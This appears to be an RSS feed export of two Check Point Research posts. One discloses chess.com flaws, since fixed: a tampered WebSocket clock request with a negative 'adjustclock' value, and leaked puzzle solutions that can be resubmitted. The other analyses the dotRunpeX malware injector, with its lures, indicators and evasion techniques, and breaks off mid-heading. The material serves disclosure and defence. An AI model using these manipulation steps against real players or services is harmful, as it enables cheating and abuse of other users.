{
    "articles": [
        {
            "title": "CheckMate",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "CheckMate"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/checkmate/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/checkmate/",
            "authors": [
                {
                    "name": "etal"
                }
            ],
            "author": "etal",
            "author_detail": {
                "name": "etal"
            },
            "published": "Thu, 16 Mar 2023 09:58:00 +0000",
            "published_parsed": [
                2023,
                3,
                16,
                9,
                58,
                0,
                3,
                75,
                0
            ],
            "tags": [
                {
                    "term": "Check Point Research Publications",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27626",
            "guidislink": false,
            "summary": "<p>Research by :Oded Vaanunu / Roman Zaikin / Dan Lasker Chess.com is the world leading platform for online chess games. It is an internet chess server, news website, and social networking website. Chess.com has a strong focus on community-based forums and blogs. These social features allow players to connect with each other, become friends, share [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/checkmate/\" rel=\"nofollow\">CheckMate</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>Research by :Oded Vaanunu / Roman Zaikin / Dan Lasker Chess.com is the world leading platform for online chess games. It is an internet chess server, news website, and social networking website. Chess.com has a strong focus on community-based forums and blogs. These social features allow players to connect with each other, become friends, share [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/checkmate/\" rel=\"nofollow\">CheckMate</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p><strong><em>Research by :Oded Vaanunu / Roman Zaikin / Dan Lasker</em></strong></p>\n\n\n\n<p>Chess.com is the world leading platform for online chess games. It is an internet chess server, news website, and social networking website.<strong> </strong>Chess.com has a strong focus on community-based forums and blogs. These social features allow players to connect with each other, become friends, share their thoughts and experiences, and learn from each other.</p>\n\n\n\n<p>There are over 93 million members from all around the world and over 2.5 million active members daily.</p>\n\n\n\n<p>One of the largest chess platforms in the world, Chess.com has hosted online tournaments such as the &#8220;Chess.com Global Championship,&#8221; in which the winner wins $1,000,000.</p>\n\n\n\n<p><strong>What happened in 2022?</strong></p>\n\n\n\n<p>In 2022, Magnus Carlsen (Norwegian World champion since 2013) decided to withdraw from a tournament because he believed that Hans Niemann (American Grand Master) was a cheater.</p>\n\n\n\n<p>Chess.com <a href=\"https://www.chess.com/news/view/chesscom-hans-niemann-report-cheating\">claimed</a> : <em>\u201cNiemann has likely cheated in more than 100 Online Chess Games</em><em> </em><em>[\u2026] he is the fastest rising top player in classical OTB chess in modern history\u201d.</em></p>\n\n\n\n<p>Chess.com decided to remove Niemann from the platform and from the Global Chess Championship the day after he beat GM Magnus Carlsen. This decision has been made because Hans admitted that <strong>he cheated in chess games on the popular website</strong> in 2020. Chess.com used its cheating-detection software and discovered suspicious play.</p>\n\n\n\n<p></p>\n\n\n\n<p><em>Websites for reference:</em></p>\n\n\n\n<p><a href=\"https://edition.cnn.com/2022/10/05/sport/hans-niemann-chess-cheating-allegations-intl-hnk-spt/index.html\">https://edition.cnn.com/2022/10/05/sport/hans-niemann-chess-cheating-allegations-intl-hnk-spt/index.html</a></p>\n\n\n\n<p><a href=\"https://www.nytimes.com/2022/12/04/business/chess-cheating-scandal-magnus-carlsen-hans-niemann.html\">https://www.nytimes.com/2022/12/04/business/chess-cheating-scandal-magnus-carlsen-hans-niemann.html</a></p>\n\n\n\n<p><a href=\"https://www.bbc.com/news/world-63010107\">https://www.bbc.com/news/world-63010107</a></p>\n\n\n\n<p>Chess.com invests a lot of money in trying to detect cheaters that use various kinds of technique. Cheating in chess is a deliberate violation of the rules of chess or other behavior that is intended to give an unfair advantage to a player or team. It can occur in many forms and can take place before, during, or after a game.</p>\n\n\n\n<p><a>Chess.com </a><a href=\"https://research.checkpoint.com/feed/#_msocom_1\">[AP1]</a>&nbsp;participation relates to the rating of players to participate in games and win bigger prizes. For example, tournaments are based on ratings.</p>\n\n\n\n<p>We decided to test the popular online platform Chess.com to try to check if it is possible to cheat in the games by abusing a security vulnerability.</p>\n\n\n\n<ol type=\"1\">\n<li>We found out that it is possible to win by <strong>decreasing the opponent\u2019s time</strong> <strong>and</strong> <strong>winning the game over time,</strong> without the opponent noticing what happened.</li>\n</ol>\n\n\n\n<ul>\n<li>In addition, it is possible to <strong>extract successful chess moves to solve online puzzle challenges and win puzzle ratings</strong>. In this method, we simply need to catch the communication between the client side (player) and the server (Chess.com website). The server accidentally sends the correct solution to the puzzle! We can then abuse and cheat on puzzle championships (in which the winner gets prize money) by simply submitting the correct moves that we found. Moreover, it is possible to modify the elapsed time it took to think about the solution.</li>\n</ul>\n\n\n\n<p></p>\n\n\n\n<p><strong><u>Technical Details:</u></strong></p>\n\n\n\n<p>Chess.com uses <strong>WebSocket</strong> for inner-game communication and various tasks; each game contains a game id which can be seen in the URL:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-27629\" height=\"87\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture1.png\" width=\"802\" /></figure>\n\n\n\n<p>If the game is played by friends, Chess.com provides an additional feature to the gameplay, that allows to <strong>\u201cAdd 15 Seconds\u201d</strong> to the opponent:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27630\" height=\"178\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture2-1024x178.png\" width=\"1024\" /></figure>\n\n\n\n<p>Pressing on the button will add 15 seconds to the opponent, and the request looks like that:</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p><a id=\"_msocom_1\"></a></p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27632\" height=\"551\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture3-1-1024x551.png\" width=\"1024\" /></figure>\n\n\n\n<p>Let\u2019s dive into the parameters that are sent to the server:</p>\n\n\n\n<ul>\n<li><strong>channel</strong> \u2013 path to the game itself.</li>\n\n\n\n<li><strong>data</strong> \u2013 contains 4 attributes:<ul><li><strong>adjustclock</strong> \u2013 how much time we want to add to the opponent (150 = 15 seconds)</li></ul><ul><li><strong>gid</strong> \u2013 Identifier of the current game.</li></ul><ul><li><strong>tid</strong> \u2013 current task to perform, in this case it is <em>adjustclocks</em> in order to add time to the opponent.</li></ul>\n<ul>\n<li><strong>uid</strong> \u2013 Identifier of the opponent.</li>\n</ul>\n</li>\n\n\n\n<li><strong>id</strong> \u2013 socket sequence number which is auto-incremented every time a WebSocket request is sent.</li>\n\n\n\n<li><strong>clientId</strong> \u2013 user click id (in this example, this is the attacker id).</li>\n</ul>\n\n\n\n<p>We have found that it is possible to <strong>win any game</strong> if the attacker sends a friend request during/before the game to the opponent, and the opponent approves it.</p>\n\n\n\n<p>We can think of a scenario in which the attacker-friendly chats with its opponent during the game. The innocent opponent (victim) approves the friend request without a doubt. Finally, the option of \u201cadding time\u201d is provided, and the attacker abuses it in order to reduce the timing clock of the victim to 0.</p>\n\n\n\n<p>The attacker is ab</p>\n\n\n\n<p>le to intercept the WebSocket request with any proxy tool (e.g. BurpSuite) and to change the sending request to <a href=\"https://live2.chess.com/cometd\">https://live2.chess.com/cometd</a> with the following <em>adjustclock</em> data:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27633\" height=\"591\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture4-1024x591.png\" width=\"1024\" /></figure>\n\n\n\n<p>In this request the sending <em>adjustclock</em> value is <em>-8990</em> and as a result the opponent will have just 10 seconds to play and will certainly lose the game without noticing that its time on the clock has been considerably reduced:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27634\" height=\"767\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture5-1024x767.png\" width=\"1024\" /></figure>\n\n\n\n<p>In conclusion, it is possible to win any game if the opponent <strong>approves</strong> the friend request:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-27635\" height=\"547\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture6.png\" width=\"974\" /></figure>\n\n\n\n<p>Because rating is very important in chess and the integrity of the game and the puzzles the player solves, we also looked at the puzzle\u2019s logic and found out that it is also possible to solve the puzzle with only one modified request.</p>\n\n\n\n<p>Explanation of the puzzle\u2019s logic based on two requests:</p>\n\n\n\n<p>First is an HTTP request &nbsp;<a href=\"https://www.chess.com/callback/tactics/rated/next\"><em>https://www.chess.com/callback/tactics/rated/next</em></a> which contains the following important parameters:</p>\n\n\n\n<ol type=\"a\">\n<li><strong>id</strong> \u2013 the challenge identifier to be submitted<ol><li><strong>tcnMoveList</strong> \u2013 the challenge solution, the expected solution to be sent to the server</li></ol>\n<ol>\n<li><strong>averageSeconds</strong> \u2013 the average solve rate</li>\n</ol>\n</li>\n</ol>\n\n\n\n<p><em>Here is an example of this request.</em></p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27636\" height=\"444\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture7-1024x444.png\" width=\"1024\" /></figure>\n\n\n\n<p>The <em>MoveList</em> is the actual solution for the puzzle and is expected by the server in order to confirm that the challenge is correctly solved.</p>\n\n\n\n<p>All the attacker needs to do in order to solve the puzzle is to send that list of movers to the request to <a href=\"https://www.chess.com/callback/tactics/submitMoves\"><em>https://www.chess.com/callback/tactics/submitMoves</em></a><em> </em>with the 3 modified parameters:</p>\n\n\n\n<ul>\n<li><em>tacticsProblemId</em> \u2013 identifier of the challenge.</li>\n\n\n\n<li><em>totalTime</em> \u2013 time that took us to solve the challenge, which can be the average time from the previous request.</li>\n\n\n\n<li><em>moves</em> \u2013 the value of <em>tcnMoveList,</em> which is the actual solution to the puzzle.</li>\n</ul>\n\n\n\n<p>By sending those parameters without even playing allows the attacker to raise his score:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27637\" height=\"478\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture8-1024x478.png\" width=\"1024\" /></figure>\n\n\n\n<p>This is how it is possible to cheat in puzzles and to win ranking without playing:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img alt=\"\" class=\"wp-image-27638\" height=\"288\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Picture9-1024x288.png\" width=\"1024\" /></figure>\n\n\n\n<p><strong>Responsible disclosure:</strong></p>\n\n\n\n<p>CPR has disclosed this information to the chess.com teams which acknowledged the vulnerability and applied a fix</p>\n\n\n\n<p>to it.</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/checkmate/\" rel=\"nofollow\">CheckMate</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "DotRunpeX \u2013 demystifying new virtualized .NET injector used in the wild",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "DotRunpeX \u2013 demystifying new virtualized .NET injector used in the wild"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/dotrunpex-demystifying-new-virtualized-net-injector-used-in-the-wild/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/dotrunpex-demystifying-new-virtualized-net-injector-used-in-the-wild/",
            "authors": [
                {
                    "email": "elism@checkpoint.com"
                }
            ],
            "author": "elism@checkpoint.com",
            "author_detail": {
                "email": "elism@checkpoint.com"
            },
            "published": "Wed, 15 Mar 2023 12:30:47 +0000",
            "published_parsed": [
                2023,
                3,
                15,
                12,
                30,
                47,
                2,
                74,
                0
            ],
            "tags": [
                {
                    "term": "Check Point Research Publications",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27641",
            "guidislink": false,
            "summary": "<p><a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/ImplMap2x64dbg.7z\">ImplMap2x64dbg</a><a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Invoke-DotRunpeXextract.7z\">Invoke-DotRunpeXextract</a></p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/dotrunpex-demystifying-new-virtualized-net-injector-used-in-the-wild/\" rel=\"nofollow\">DotRunpeX &#8211; demystifying new virtualized .NET injector used in the wild</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p><a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/ImplMap2x64dbg.7z\">ImplMap2x64dbg</a><a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Invoke-DotRunpeXextract.7z\">Invoke-DotRunpeXextract</a></p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/dotrunpex-demystifying-new-virtualized-net-injector-used-in-the-wild/\" rel=\"nofollow\">DotRunpeX &#8211; demystifying new virtualized .NET injector used in the wild</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p></p>\n\n\n\n<h1 class=\"wp-block-heading\">Highlights:</h1>\n\n\n\n<ul>\n<li><em><strong>Check Point Research (CPR) provides an in-depth analysis of the dotRunpeX injector and its relation to the older version</strong></em></li>\n\n\n\n<li><em><strong>DotRunpeX is protected by virtualization (a customized version of KoiVM) and obfuscation (ConfuserEx) &#8211; both were defeated</strong></em></li>\n\n\n\n<li><em><strong>Investigation shows that dotRunpeX is used in the wild to deliver numerous known malware families</strong></em></li>\n\n\n\n<li><em><strong>Commonly distributed via phishing emails as malicious attachments and websites masquerading as regular program utilities</strong></em></li>\n\n\n\n<li><em><strong>We confirmed and detailed the malicious use of a vulnerable process explorer driver to disable the functionality of Anti-Malware services</strong></em></li>\n\n\n\n<li><em><strong>CPR introduces several PoC techniques that were approved to be effective for reverse engineering protected or virtualized dotnet code</strong></em></li>\n</ul>\n\n\n\n<h1 class=\"wp-block-heading\">Introduction</h1>\n\n\n\n<p>During the past few months, we have been monitoring the dotRunpeX malware, its usage in the wild, and infection vectors related to dozens of campaigns. The monitoring showed that this new dotnet injector is still evolving and in high development. We uncovered several different methods of distribution where in all cases, the dotRunpeX was a part of the second-stage infection. This new threat is used to deliver numerous different malware families, primarily related to stealers, RATs, loaders, and downloaders.</p>\n\n\n\n<p>The oldest sample related to the new version of dotRunpeX is dated&nbsp;<strong>2022-10-17</strong>. The first&nbsp;<a href=\"https://twitter.com/vinopaljiri/status/1585308917722009603\">public information</a>&nbsp;about this threat is dated&nbsp;<strong>2022-10-26</strong>.</p>\n\n\n\n<p>The main subject of this research is an in-depth analysis of both versions of the dotRunpeX injector, focusing on interesting techniques, similarities between them, and an introduction to the PoC technique used to analyze a new version of dotRunpeX as it is being delivered virtualized by a customized version of&nbsp;<a href=\"https://github.com/yck1509/KoiVM\">KoiVM .NET protector</a>.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Background &amp; Key Findings</h1>\n\n\n\n<p>DotRunpeX is a new injector written in .NET using the Process Hollowing technique and used to infect systems with a variety of known malware families. Although this injector is new, there are some connections to its older version sharing some similarities. The name of this injector is based on its version information which is the same for both dotRunpeX versions, consistent across all samples we analyzed and containing ProductName &#8211;&nbsp;<code>RunpeX.Stub.Framework</code>.</p>\n\n\n\n<p>While we have been monitoring this threat, we spotted a few publicly shared pieces of information, mainly by independent researchers, that were related to the functionality of dotRunpeX but misattributed to a different well-known malware family.</p>\n\n\n\n<p>We are aware of a&nbsp;<a href=\"https://www.sentinelone.com/labs/malvirt-net-virtualization-thrives-in-malvertising-attacks/\">publication</a>&nbsp;about one campaign delivering this threat, but our findings and conclusions based on the report below slightly differ. By monitoring this threat for a few months, we got enough information to differentiate the first-stage loaders from the second stage (<em><strong>dotRunpeX</strong></em>) with no signs of the relation between them. We revealed the connections to its older version, the distribution of numerous malware families, and several different techniques used as a vector of infection.</p>\n\n\n\n<p>Among the variety of downloaders and cryptocurrency stealers, we spotted these known malware families delivered by dotRunpeX:</p>\n\n\n\n<ul>\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.agent_tesla\">AgentTesla</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.arrowrat\">ArrowRAT</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.asyncrat\">AsyncRat</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.ave_maria\">AveMaria/WarzoneRAT</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.bit_rat\">BitRAT</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.formbook\">Formbook</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.lgoogloader\">LgoogLoader</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.lokipws\">Lokibot</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.netwire\">NetWire</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.privateloader\">PrivateLoader</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.quasar_rat\">QuasarRAT</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.recordbreaker\">RecordBreaker &#8211; Raccoon Stealer 2.0</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer\">Redline</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.remcos\">Remcos</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.rhadamanthys\">Rhadamanthys</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.404keylogger\">SnakeKeylogger</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.vidar\">Vidar</a></li>\n\n\n\n<li><a href=\"https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm\">XWorm</a></li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27642\" height=\"666\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId44.png\" width=\"967\" /><figcaption class=\"wp-element-caption\">Figure 1: Malware Families Delivered by DotRunpeX</figcaption></figure></div>\n\n\n<p>From the timeline perspective, based on the compilation timestamps of dotRunpeX samples that did not appear to be altered, this new threat became popular mainly during November 2022 and January 2023. What could be just an interesting coincidence or just some kind of sign of attackers waiting under the Christmas tree is that we did not see a lot of samples compiled during December 2022.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27644\" height=\"535\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId47-1.png\" width=\"961\" /><figcaption class=\"wp-element-caption\">Figure 2: DotRunpeX Timeline &#8211; Compilation Timestamps</figcaption></figure></div>\n\n\n<h2 class=\"wp-block-heading\">Vector of infection</h2>\n\n\n\n<p>DotRunpeX injector commonly comes as a second stage of the original infection. The typical first stages are very different variants of .NET loaders/downloaders. The first-stage loaders are primarily being delivered via phishing emails as malicious attachments (usually as a part of \u201c.iso\u201d, \u201c.img\u201d, \u201c.zip\u201d, and \u201c.7z\u201d) or via websites masquerading as regular program utilities. Apart from the most common infection vectors, the customers of dotRunpeX are not ashamed to abuse Google Ads or even target other potential attackers via trojanized malware builders.</p>\n\n\n\n<p>Example phishing email&nbsp;<code>Transaction Advice 502833272391_RPY - 29/10/2022</code>&nbsp;delivering the first stage loader as a part of malicious \u201c.7z\u201d attachment that results in loading of dotRunpeX (SHA256: \u201c457cfd6222266941360fdbe36742486ee12419c95f1d7d350243e795de28200e\u201d).</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27645\" height=\"379\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId50-1024x379.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 3: Phishing email \u201cTransaction Advice 502833272391_RPY &#8211; 29/10/2022\u201d</figcaption></figure></div>\n\n\n<p>Example phishing websites &#8211; masquerading regular program utilities (Galaxy Swapper, OBS Studio, Onion Browser, Brave Wallet, LastPass, AnyDesk, MSI Afterburner) and delivering the first stage loaders that result in dotRunpeX infection in a part of the second stage.</p>\n\n\n\n<p>Website masquerading as Galaxy Swapper:&nbsp;<code>https://www.galaxyswapper[.]ru/</code></p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27646\" height=\"528\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId53-1024x528.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 4: Google search for the utility Galaxy Swapper leads to \u201chttps://www.galaxyswapper[.]ru/\u201d</figcaption></figure></div>\n\n\n<p>Download redirects to&nbsp;<code>https://gitlab[.]com/forhost1232/galaxyv19.11.14/-/raw/main/GalaxyV19.11.14.zip</code>.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27647\" height=\"672\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId56-1024x672.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 5: Download button on \u201chttps://www.galaxyswapper[.]ru/\u201d redirects to a trojanized program</figcaption></figure></div>\n\n\n<p>Website masquerading as LastPass Password Manager:&nbsp;<code>http://lastpass[.]shop/en/</code></p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27648\" height=\"483\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId59-1024x483.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 6: Website \u201chttp://lastpass[.]shop/en/\u201d masquerading as LastPass Password Manager</figcaption></figure></div>\n\n\n<p>The fake website of LastPass Password Manager was already down at the time of the investigation. Still, we can confirm that the fake software was downloaded from the \u201c<em><strong>Final URL</strong></em>\u201d&nbsp;<code>https://gitlab[.]com/forhost1232/lastpassinstaller/-/raw/main/LastPassInstaller.zip</code>.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27649\" height=\"716\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId62-1024x716.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 7: Download button on \u201chttp://lastpass[.]shop/en/\u201d redirects to a trojanized program</figcaption></figure></div>\n\n\n<p>The GitLab page&nbsp;<code>https://gitlab[.]com/forhost1232</code>&nbsp;contained dozens of programs trojanized by dotRunpeX malware.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27650\" height=\"624\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId65-1024x624.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 8: Dozens of trojanized programs on GitLab repository \u201chttps://gitlab[.]com/forhost1232\u201d</figcaption></figure></div>\n\n\n<p>All of the trojanized programs on the previously mentioned GitLab page contain the main .NET application enlarged with an overlay to avoid scanning with sandboxes very likely.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27651\" height=\"521\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId68-1024x521.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 9: Examples of trojanized programs served by the GitLab repository \u201chttps://gitlab[.]com/forhost1232\u201d</figcaption></figure></div>\n\n\n<p>The mentioned .NET applications with overlay are the typical first stages, behaving as dotnet loaders with simple obfuscation. These different variants of loaders use reflection to load the dotRunpeX injector in the second stage. Some of them are very simple, and some are more advanced.</p>\n\n\n\n<p>Simple first-stage loader (direct usage of method&nbsp;<code>System.Reflection.Assembly.Load()</code>):</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27652\" height=\"222\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId71-1024x222.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 10: Simple first-stage loader</figcaption></figure></div>\n\n\n<p>An example of a more advanced first-stage loader (using AMSI Bypass and&nbsp;<code>DynamicMethod</code>&nbsp;to load and execute the second stage via reflection) can be seen below. The advantage of this kind of advanced loader is that there is no direct reference to&nbsp;<code>System.Reflection.Assembly.Load()</code>&nbsp;method so it could possibly avoid detection of engines relying on static parsing of .NET metadata.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27653\" height=\"524\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId74-1024x524.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 11: More advanced first-stage loader using AMSI bypass and DynamicMethod</figcaption></figure></div>\n\n\n<p>Deobfuscated form of the latter one could be seen in the picture below:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27655\" height=\"532\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId77-1024x532.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 12: A deobfuscated form of a more advanced first-stage loader</figcaption></figure></div>\n\n\n<p>Programmatic way of second-stage extraction (dotRunpeX stage) from these kinds of loaders could be simply implemented using&nbsp;<a href=\"https://github.com/Washi1337/AsmResolver\">AsmResolver</a>&nbsp;and&nbsp;<a href=\"https://learn.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection\">reflection</a>&nbsp;as shown below.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27656\" height=\"565\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId82-1024x565.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 13: Extraction of dotRunpeX from first-stage loader using AsmResolver and reflection</figcaption></figure></div>\n\n\n<p>Important to note that those examples of phishing websites leading to the GitLab page were related to just one campaign where the dotRunpeX injector was always responsible for injecting Redline malware with C2 &#8211;&nbsp;<code>77.73.134.2</code>.</p>\n\n\n\n<p>In addition to the most common vectors of infection mentioned earlier, we observed quite an interesting case of infection vector, where a customer of dotRunpeX was probably bored enough to target ordinary victims and decided to target other potential attackers. Something that is supposed to be a Redline builder&nbsp;<code>Redline_20_2_crack.rar</code>&nbsp;(SHA256: \u201c0e40e504c05c30a7987785996e2542c332100ae7ecf9f67ebe3c24ad2468527c\u201d) was trojanized with a downloader that uses a reflection to load dotRunpeX as a hidden \u201c<em><strong>added feature</strong></em>\u201d of the builder.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27657\" height=\"330\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId85-1024x330.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 14: Folder structure of trojanized Redline builder</figcaption></figure></div>\n\n\n<p>It turned out that during the building process of the Redline, configured to your needs, one will also get another Redline sample, probably the one that you didn\u2019t desire, as a gift embedded in the dotRunpeX.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-27658\" height=\"649\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/KSIHA4X3CW-rId88-1024x649.png\" width=\"1024\" /><figcaption class=\"wp-element-caption\">Figure 15: Downloader that uses a reflection to load dotRunpeX delivering another Redline malware</figcaption></figure></div>\n\n\n<h2 class=\"wp-block-heading\"><strong>Technical Analysis: Highlights</strong></h2>\n\n\n\n<h3 class=\"wp-block-heading\">The old version of dotRunpeX:</h3>\n\n\n\n<ul>\n<li>Using custom obfuscation &#8211; only obfuscations of names</li>\n\n\n\n<li>Configurable but limited (target for payload injection, elevation + UAC Bypass, XOR key for payload decryption)</li>\n\n\n\n<li>Only one UAC Bypass technique</li>\n\n\n\n<li>Using simple XOR to decrypt the main payload to be injected</li>\n\n\n\n<li>Using&nbsp;<a href=\"https://github.com/TheWover/DInvoke\">D/Invoke</a>&nbsp;similar technique to call native code (based on using&nbsp;<code>GetDelegateForFunctionPointer()</code>) &#8211; but using decoy syscall routine</li>\n\n\n\n<li>Using D/Invoke for remapping of \u201c<em><strong>ntdll.dll</strong></em>\u201d</li>\n</ul>\n\n\n\n<h3 